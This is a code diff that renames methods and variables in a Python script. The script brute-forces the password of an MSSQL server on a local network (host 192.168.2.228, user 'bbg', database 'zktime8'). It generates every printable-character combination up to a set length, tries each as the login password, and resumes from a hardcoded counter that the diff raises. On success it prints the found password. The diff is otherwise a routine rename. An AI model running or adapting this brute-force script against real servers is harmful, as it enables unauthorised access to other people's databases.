@@ -7,7 +7,6 @@ import string
 class MsSql:
     """
     对pymssql的简单封装
-
     """
 
     def __init__(self, host, user, pwd, db):
@@ -16,7 +15,7 @@ class MsSql:
         self.pwd = pwd
         self.db = db
 
-    def __GetConnect(self):
+    def __get_connect(self):
         """
         得到连接信息
         返回: conn.cursor()
@@ -30,26 +29,26 @@ class MsSql:
         else:
             return cur
 
-    def ExecQuery(self, sql):
+    def exec_query(self, sql):
         """
         执行查询语句
         返回的是一个包含tuple的list，list的元素是记录行，tuple的元素是每行记录的字段
 
         调用示例：
                 ms = MSSQL(host="localhost",user="sa",pwd="123456",db="PythonWeiboStatistics")
-                resList = ms.ExecQuery("SELECT id,NickName FROM WeiBoUser")
+                res_list = ms.ExecQuery("SELECT id,NickName FROM WeiBoUser")
                 for (id,NickName) in resList:
                     print str(id),NickName
         """
-        cur = self.__GetConnect()
+        cur = self.__get_connect()
         cur.execute(sql)
-        resList = cur.fetchall()
+        res_list = cur.fetchall()
 
         # 查询完毕后必须关闭连接
         self.conn.close()
-        return resList
+        return res_list
 
-    def ExecNonQuery(self, sql):
+    def exec_non_query(self, sql):
         """
         执行非查询语句
 
@@ -59,21 +58,21 @@ class MsSql:
             self.conn.commit()
             self.conn.close()
         """
-        cur = self.__GetConnect()
+        cur = self.__get_connect()
         cur.execute(sql)
         self.conn.commit()
         self.conn.close()
 
 
-def crack_dict(max, min=1, chars=None):
+def crack_dict(max_len, min_len=1, chars=None):
     # 生成密码字典
-    assert max >= min >= 1
+    assert max_len >= min_len >= 1
 
     if chars is None:
         chars = string.printable[:-5]  # -38:数字+大小写字母，-64：数字+小写字母，-90：数字
 
     p = []
-    for i in range(min, max + 1):
+    for i in range(min_len, max_len + 1):
         p.append(itertools.product(chars, repeat=i))
     return itertools.chain(*p)
 
@@ -83,11 +82,11 @@ def main(n):
     i = 0
     for j in password:
         i += 1
-        if i >= 197578:  # 断点
+        if i >= 518128:  # 断点
             try:
                 ms = MsSql(host="192.168.2.228", user="bbg", pwd=''.join(tuple(j)),
                            db="zktime8")
-                query = ms.ExecQuery("SELECT GETDATE() AS CurrentDateTime")
+                query = ms.exec_query("SELECT GETDATE() AS CurrentDateTime")
                 print('Success!', j, ';', query)
                 input('Wait........')
             except Exception as e:
